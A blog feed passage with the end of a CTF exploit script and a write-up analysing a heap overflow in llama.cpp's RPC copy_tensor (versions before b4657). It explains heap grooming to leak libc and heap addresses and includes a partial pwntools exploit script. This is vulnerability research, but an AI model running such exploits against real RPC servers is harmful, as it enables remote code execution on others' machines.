class="string">&quot;port&quot;</span>: <span class="number">8081</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">GET /flag.html HTTP/1.1</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">DNT: 1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:8081</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;函数名是 ai 恢复的，不过不影响看&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;题目实现了一个 s</summary>
      
    
    
    
    <category term="Write Up" scheme="https://the-soloist.github.io/category/Write-Up/"/>
    
    
    <category term="CTF" scheme="https://the-soloist.github.io/tag/CTF/"/>
    
  </entry>
  
  <entry>
    <title>llama.cpp版本小于b4657时COPY_TENSOR越界写漏洞导致的RCE分析</title>
    <link href="https://the-soloist.github.io/2025/09/15/llama-cpp-tensor-rce2/"/>
    <id>https://the-soloist.github.io/2025/09/15/llama-cpp-tensor-rce2/</id>
    <published>2025-09-15T11:58:24.000Z</published>
    <updated>2025-12-17T15:05:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>问题处在 ggml 组件中，影响的最后一个 tag 是 b4651。在 llama.cpp 修复了 <a href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-5vm9-p64x-gqw9">GHSA-5vm9-p64x-gqw9</a>和<a href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-wcr5-566p-9cwj">GHSA-wcr5-566p-9cwj</a> 之后，<code>rpc_server::copy_tensor</code> 中仍然存在堆溢出漏洞。</p><p>参考链接：</p><ul><li><a href="https://github.com/ggml-org/llama.cpp/commit/1d20e53c40c3cc848ba2b95f5bf7c075eeec8b19">https://github.com/ggml-org/llama.cpp/commit/1d20e53c40c3cc848ba2b95f5bf7c075eeec8b19</a></li><li><a href="https://github.com/ggml-org/ggml/pull/1103">https://github.com/ggml-org/ggml/pull/1103</a></li></ul><p><a href="https://retr0.blog/blog/llama-rpc-rce">Llama’s Paradox</a> 文章并没有涉及到对内存行为的分析，笔者在研究了分配过程之后实现了更简单的利用方式</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="COPY-TENSOR"><a href="#COPY-TENSOR" class="headerlink" title="COPY_TENSOR"></a>COPY_TENSOR</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">rpc_server::copy_tensor</span><span class="params">(<span class="type">const</span> rpc_msg_copy_tensor_req &amp; request, rpc_msg_copy_tensor_rsp &amp; response)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ggml_init_params</span> params &#123;</span><br><span class="line">        <span class="comment">/*.mem_size   =*/</span> <span class="number">2</span>*<span class="built_in">ggml_tensor_overhead</span>(),</span><br><span class="line">        <span class="comment">/*.mem_buffer =*/</span> <span class="literal">NULL</span>,</span><br><span class="line">        <span class="comment">/*.no_alloc   =*/</span> <span class="literal">true</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ggml_context</span> * ctx = <span class="built_in">ggml_init</span>(params);</span><br><span class="line">    ggml_tensor * src = <span class="built_in">deserialize_tensor</span>(ctx, &amp;request.src);</span><br><span class="line">    ggml_tensor * dst = <span class="built_in">deserialize_tensor</span>(ctx, &amp;request.dst);</span><br><span class="line">    <span class="keyword">if</span> (src == <span class="literal">nullptr</span> || dst == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">GGML_LOG_ERROR</span>(<span class="string">&quot;[%s] error deserializing tensors\n&quot;</span>, __func__);</span><br><span class="line">        <span class="built_in">ggml_free</span>(ctx);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">GGML_PRINT_DEBUG</span>(<span class="string">&quot;[%s] src-&gt;buffer: %p, dst-&gt;buffer: %p\n&quot;</span>, __func__, (<span class="type">void</span>*)src-&gt;buffer, (<span class="type">void</span>*)dst-&gt;buffer);</span><br><span class="line">    response.result = <span class="built_in">ggml_backend_buffer_copy_tensor</span>(src, dst);</span><br><span class="line">    <span class="built_in">ggml_free</span>(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ggml_backend_buffer_copy_tensor</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> ggml_tensor * src, <span class="keyword">struct</span> ggml_tensor * dst)</span> </span>&#123;</span><br><span class="line">    <span class="type">ggml_backend_buffer_t</span> dst_buf = dst-&gt;view_src ? dst-&gt;view_src-&gt;buffer : dst-&gt;buffer;</span><br><span class="line">    <span class="keyword">if</span> (dst_buf-&gt;iface.cpy_tensor) &#123;</span><br><span class="line">        <span class="keyword">return</span> dst_buf-&gt;iface.<span class="built_in">cpy_tensor</span>(dst_buf, src, dst);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">GGML_CALL <span class="type">static</span> <span class="type">bool</span> <span class="title">ggml_backend_cpu_buffer_cpy_tensor</span><span class="params">(<span class="type">ggml_backend_buffer_t</span> buffer, <span class="type">const</span> <span class="keyword">struct</span> ggml_tensor * src, <span class="keyword">struct</span> ggml_tensor * dst)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ggml_backend_buffer_is_host</span>(src-&gt;buffer)) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(dst-&gt;data, src-&gt;data, <span class="built_in">ggml_nbytes</span>(src));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GGML_UNUSED</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用链</p><ul><li>​rpc_server::copy_tensor​<ul><li>​ggml_backend_buffer_copy_tensor​<ul><li>​ggml_backend_cpu_buffer_cpy_tensor​</li></ul></li></ul></li></ul><p>​<code>rpc_server::copy_tensor</code>​ 在 deserialize_tensor​ 之后没有计算 <code>ggml_nbytes(src)​</code> 和 <code>ggml_nbytes(dst)</code>​ 的大小。deserialize_tensor​ 也会把 ne 和 nb 两个数组复制到 result 里，我们能完全控制，所以可以构造 <code>ggml_nbytes(src)</code>大于 <code>dst-&gt;data</code> 的 buffer 来实现溢出</p><h2 id="内存分配过程"><a href="#内存分配过程" class="headerlink" title="内存分配过程"></a>内存分配过程</h2><p>llama rpc 有一些难以解释的行为，我们这里随便 alloc 几个 buffer，可以看到 chunk 全部被打散了，并且还伴随着一些 tcache bins 的释放</p><p><img src="/2025/09/15/llama-cpp-tensor-rce2/../llama-cpp-tensor-rce2/6f5bd88375aaa69f7e197aecc86e3139.png"><img src="llama-cpp-tensor-rce2/791d57850d3073565ca051f87c1fb304.png">​</p><p>笔者仔细研究了一下内存的分配过程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">rpc_server::alloc_buffer</span><span class="params">(<span class="type">const</span> rpc_msg_alloc_buffer_req &amp; request, rpc_msg_alloc_buffer_rsp &amp; response)</span> </span>&#123;</span><br><span class="line">    <span class="type">ggml_backend_buffer_type_t</span> buft = <span class="built_in">ggml_backend_get_default_buffer_type</span>(backend);</span><br><span class="line">    <span class="type">ggml_backend_buffer_t</span> buffer = <span class="built_in">ggml_backend_buft_alloc_buffer</span>(buft, request.size);</span><br><span class="line">    response.remote_ptr = <span class="number">0</span>;</span><br><span class="line">    response.remote_size = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (buffer != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        response.remote_ptr = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint64_t</span>&gt;(buffer);</span><br><span class="line">        response.remote_size = buffer-&gt;size;</span><br><span class="line">        <span class="built_in">GGML_PRINT_DEBUG</span>(<span class="string">&quot;[%s] size: %&quot;</span> PRIu64 <span class="string">&quot; -&gt; remote_ptr: %&quot;</span> PRIx64 <span class="string">&quot;, remote_size: %&quot;</span> PRIu64 <span class="string">&quot;\n&quot;</span>, __func__, request.size, response.remote_ptr, response.remote_size);</span><br><span class="line">        buffers.<span class="built_in">insert</span>(buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">GGML_LOG_ERROR</span>(<span class="string">&quot;[%s] size: %&quot;</span> PRIu64 <span class="string">&quot; -&gt; failed\n&quot;</span>, __func__, request.size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alloc_buffer 到实际的分配函数的调用链如下：</p><ul><li>rpc_server::alloc_buffer<ul><li>ggml_backend_buft_alloc_buffer<ul><li>ggml_backend_cpu_buffer_type_alloc_buffer<ul><li>ggml_aligned_malloc<ul><li>posix_memalign<ul><li>_int_memalign</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><p>在 ggml_aligned_malloc 函数中，设置了一个固定的 alignment</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> * <span class="title">ggml_aligned_malloc</span><span class="params">(<span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> alignment = <span class="number">64</span>;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>所以在尝试分配 0x50 大小 buffer 的时候，posix_memalign 传入的参数如下</p><p><img src="/2025/09/15/llama-cpp-tensor-rce2/../llama-cpp-tensor-rce2/d2809e29ce9b7c022d9deceae1fd658a.png">​</p><p><img src="/2025/09/15/llama-cpp-tensor-rce2/../llama-cpp-tensor-rce2/bb8df19f3811b9a77e5812f85531aff6.png">​</p><p>一直到<code>_int_memalign</code>发现 malloc 的 size 变成了 0xc0</p><p><img src="/2025/09/15/llama-cpp-tensor-rce2/../llama-cpp-tensor-rce2/7f7812814ac1659e445421e2959108ec.png">​</p><p>检查一下 glibc 的代码，malloc 的 size 实际上是<code>0x10+0x50(size)+0x40(alignment)+0x20(MINSIZE)=0xc0</code>（我们最后拿到的是<code>0x50</code>这部分，0x10 是提前预留出来的 header）</p><p><img src="/2025/09/15/llama-cpp-tensor-rce2/../llama-cpp-tensor-rce2/6a57dd1caa920640d27224ceafe2ace5.png">​</p><p>在 malloc 之后，<code>_int_memalign</code>会两次判断</p><ol><li>​<code>if ((((unsigned long) (m)) % alignment) != 0)</code>​<ul><li>​<code>_int_memalign</code>先判断 m 地址能够被 alignment 整除，不可以才会进入 if 逻辑，然后从 chunk 头部开始返还 0x20</li></ul></li><li>​<code>if (!chunk_is_mmapped (p))</code>​<ul><li>chunk 不是 mmap 出来的则会从尾部开始返还 0x50，如果没有返还开头，则会直接返还 0x70</li></ul></li></ol><p>此时堆分布如下，所以大部分情况下，我们拿到的 <code>tensor-&gt;data</code> 都是空的，并且这也是为什么出现了“难以解释的行为”。</p><p><img src="/2025/09/15/llama-cpp-tensor-rce2/../llama-cpp-tensor-rce2/2da75e72babb0320f8bb97b7449b393b.png">​</p><p>最完美的情况就是这种，笔者发现<code>0x40(alignment)+0x20(MINSIZE)</code>刚好等于 0x60，这和<code>ggml_backend_buffer_t buffer</code>的大小相同。</p><p>由于<code>0x555555580e80 % 0x40 == 0</code>，<code>_int_memalign</code>不会进入第一个 if 逻辑，我们拿到的 chunk 不会被分割，进入第二个 if 后会返还尾部的 0x70 到 tcache bins，</p><p><img src="/2025/09/15/llama-cpp-tensor-rce2/../llama-cpp-tensor-rce2/36d292fe6b2bd5d058766c8f9f1884a6.png">​</p><p>​<code>ggml_aligned_malloc</code>后，就会被<code>ggml_backend_buffer_init</code>​ 立即分配出来</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">ggml_backend_buffer_t</span> <span class="title">ggml_backend_cpu_buffer_type_alloc_buffer</span><span class="params">(<span class="type">ggml_backend_buffer_type_t</span> buft, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="type">void</span> * data = <span class="built_in">ggml_aligned_malloc</span>(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">GGML_LOG_ERROR</span>(<span class="string">&quot;%s: failed to allocate buffer of size %zu\n&quot;</span>, __func__, size);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ggml_backend_buffer_init</span>(buft, ggml_backend_cpu_buffer_i, data, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/15/llama-cpp-tensor-rce2/../llama-cpp-tensor-rce2/c1bb31ffde5bc93af3d72c60ed8ad245.png">​</p><p>当这两个 chunk 是从 unsorted bin 中分配出来的时候，幸运的是 llama 并没有清空 chunk（CTF 选手的 DNS 又动了），我们可以通过 get_tensor 直接泄露出 libc 和 heap 地址。</p><p><img src="/2025/09/15/llama-cpp-tensor-rce2/../llama-cpp-tensor-rce2/2b4903b13b4f34402f1b178235b27d59.png">​</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>经过对内存分配过程的研究，只要经过一定程度的堆风水，我们就可以轻松的泄露出 libc 和 heap 地址，因此利用会变得非常简单。</p><p><img src="/2025/09/15/llama-cpp-tensor-rce2/../llama-cpp-tensor-rce2/25cd87a545d7afed1272f78e5d697679.png">​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># https://github.com/the-soloist/pwn-toolkit</span></span><br><span class="line"><span class="keyword">from</span> pwnkit <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">args = init_pwn_args()</span><br><span class="line">binary = ELF(<span class="string">&quot;./build/bin/rpc-server&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">ggml_so = ELF(<span class="string">&quot;/share/llama.cpp/llama-b4651/build/bin/libggml.so&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">args.info.binary = context.binary = binary</span><br><span class="line">args.env.kwargs = &#123;<span class="string">&quot;gdbscript&quot;</span>: <span class="string">&quot;&quot;</span>, &#125;</span><br><span class="line"></span><br><span class="line">ALLOC_BUFFER = <span class="number">0</span></span><br><span class="line">GET_ALIGNMENT = <span class="number">1</span></span><br><span class="line">GET_MAX_SIZE = <span class="number">2</span></span><br><span class="line">BUFFER_GET_BASE = <span class="number">3</span></span><br><span class="line">FREE_BUFFER = <span class="number">4</span></span><br><span class="line">BUFFER_CLEAR = <span class="number">5</span></span><br><span class="line">SET_TENSOR = <span class="number">6</span></span><br><span class="line">GET_TENSOR = <span class="number">7</span></span><br><span class="line">COPY_TENSOR = <span class="number">8</span></span><br><span class="line">GRAPH_COMPUTE = <span class="number">9</span></span><br><span class="line">GET_DEVICE_MEMORY = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RpcConnection</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">50052</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_rpc_cmd</span>(<span class="params">self, cmd, buf</span>):</span><br><span class="line">        packet = p8(cmd)         <span class="comment"># cmd, 1 byte</span></span><br><span class="line">        packet += p64(<span class="built_in">len</span>(buf))  <span class="comment"># msg size, 8 bytes</span></span><br><span class="line">        packet += buf            <span class="comment"># content, size of the buffer you want to allocate</span></span><br><span class="line">        <span class="variable language_">self</span>.io.send(packet)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">alloc_buffer</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="variable language_">self</span>.send_rpc_cmd(ALLOC_BUFFER, p64(size))</span><br><span class="line"></span><br><span class="line">        received = <span class="variable language_">self</span>.io.recvn(<span class="number">0x18</span>)</span><br><span class="line">        ptr = u64(received[<span class="number">0x8</span>:<span class="number">0x10</span>])</span><br><span class="line">        size = u64(received[<span class="number">0x10</span>:<span class="number">0x18</span>])</span><br><span class="line">        log.info(<span class="string">f&quot;alloc buffer @ <span class="subst">&#123;<span class="built_in">hex</span>(ptr)&#125;</span> (<span class="subst">&#123;<span class="built_in">hex</span>(size)&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ptr, size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">free_buffer</span>(<span class="params">self, ptr</span>):</span><br><span class="line">        payload = p64(ptr)</span><br><span class="line">        <span class="variable language_">self</span>.send_rpc_cmd(FREE_BUFFER, payload)</span><br><span class="line">        received = <span class="variable language_">self</span>.io.recvn(<span class="number">0x8</span>)</span><br><span class="line">        result = u64(received[:<span class="number">0x8</span>])</span><br><span class="line">        log.info(<span class="string">f&quot;free buffer : <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">buffer_get_base</span>(<span class="params">self, ptr</span>):</span><br><span class="line">        <span class="variable language_">self</span>.send_rpc_cmd(BUFFER_GET_BASE, p64(ptr))</span><br><span class="line">        received = <span class="variable language_">self</span>.io.recvn(<span class="number">0x10</span>)</span><br><span class="line">        base_ptr = u64(received[<span class="number">0x8</span>:<span class="number">0x10</span>])</span><br><span class="line">        log.info(<span class="string">f&quot;buffer get base @ <span class="subst">&#123;<span class="built_in">hex</span>(ptr)&#125;</span> -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(base_ptr)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> base_ptr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">buffer_clear</span>(<span class="params">self, remote_ptr, value=<span class="number">0x00</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.send_rpc_cmd(BUFFER_CLEAR, p64(remote_ptr) + p8(value))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_tensor</span>(<span class="params">self, tensor, offset, data</span>):</span><br><span class="line">        <span class="comment"># const rpc_tensor * in_tensor = (const rpc_tensor *)input.data();</span></span><br><span class="line">        <span class="comment"># uint64_t offset;</span></span><br><span class="line">        <span class="comment"># memcpy(&amp;offset, input.data() + sizeof(rpc_tensor), sizeof(offset));</span></span><br><span class="line">        <span class="comment"># const size_t size = input.size() - sizeof(rpc_tensor) - sizeof(offset);</span></span><br><span class="line">        payload = flat([</span><br><span class="line">            flat(tensor),</span><br><span class="line">            p64(offset),</span><br><span class="line">            data</span><br><span class="line">        ])</span><br><span class="line">        <span class="variable language_">self</span>.send_rpc_cmd(SET_TENSOR, payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_tensor</span>(<span class="params">self, tensor, offset, size</span>):</span><br><span class="line">        payload = flat([</span><br><span class="line">            flat(tensor),</span><br><span class="line">            p64(offset),</span><br><span class="line">            p64(size),</span><br><span class="line">        ])</span><br><span class="line">        <span class="variable language_">self</span>.send_rpc_cmd(GET_TENSOR, payload)</span><br><span class="line">        resp_size = u64(<span class="variable language_">self</span>.io.recvn(<span class="number">0x8</span>))</span><br><span class="line">        log.info(<span class="string">f&quot;get tensor : <span class="subst">&#123;<span class="built_in">hex</span>(resp_size)&#125;</span> bytes&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.io.recvn(resp_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">copy_tensor</span>(<span class="params">self, src_tensor, dst_tensor</span>):</span><br><span class="line">        payload = flat([src_tensor, dst_tensor])</span><br><span class="line">        <span class="variable language_">self</span>.send_rpc_cmd(COPY_TENSOR, payload)</span><br><span class="line">        received = <span class="variable language_">self</span>.io.recvn(<span class="number">0x10</span>)</span><br><span class="line">        result = u64(received[<span class="number">0x8</span>:<span class="number">0x10</span>])</span><br><span class="line">        log.info(<span class="string">f&quot;copy tensor : <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">construct_tensor</span>(<span class="params">tensor_buffer: <span class="built_in">int</span>, data: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">                     ne1: <span class="built_in">int</span>, ne2: <span class="built_in">int</span>, ne3: <span class="built_in">int</span>, ne4: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">                     nb1: <span class="built_in">int</span>, nb2: <span class="built_in">int</span>, nb3: <span class="built_in">int</span>, nb4: <span class="built_in">int</span>,</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="number">0</span>: [</span><br><span class="line">            <span class="comment"># p32(0),</span></span><br><span class="line">            <span class="number">0x1</span>,                    <span class="comment"># uint64_t id</span></span><br><span class="line">            p32(<span class="number">2</span>),                 <span class="comment"># uint32_t type GGML_TYPE_Q4_0</span></span><br><span class="line">            p64(tensor_buffer),     <span class="comment"># uint64_t buffer</span></span><br><span class="line">            [                                            <span class="comment"># uint32_t ne[GGML_MAX_DIMS];</span></span><br><span class="line">                p32(ne1), p32(ne2), p32(ne3), p32(ne4),  <span class="comment"># GGML_ASSERT(offset + size &lt;= ggml_nbytes(tensor) &amp;&amp; &quot;tensor write out of bounds&quot;) failed</span></span><br><span class="line">            ],</span><br><span class="line">            [                                            <span class="comment"># uint32_t nb[GGML_MAX_DIMS];</span></span><br><span class="line">                p32(nb1), p32(nb2), p32(nb3), p32(nb4),  <span class="comment"># :: :: xx xx xx xx: 7</span></span><br><span class="line">            ],</span><br><span class="line">            p32(<span class="number">0</span>),                 <span class="comment"># uint32_t op</span></span><br><span class="line">            [p32(<span class="number">0</span>)] * <span class="number">16</span>,          <span class="comment"># int32_t op_params (corrected from 8 to 16)</span></span><br><span class="line">            p32(<span class="number">0</span>),                 <span class="comment"># int32_t flags</span></span><br><span class="line">            [p64(<span class="number">0</span>)] * <span class="number">10</span>,          <span class="comment"># uint64_t src</span></span><br><span class="line">            p64(<span class="number">0</span>),                 <span class="comment"># uint64_t view_src</span></span><br><span class="line">            p64(<span class="number">0</span>),                 <span class="comment"># uint64_t view_offs</span></span><br><span class="line">            p64(data),              <span 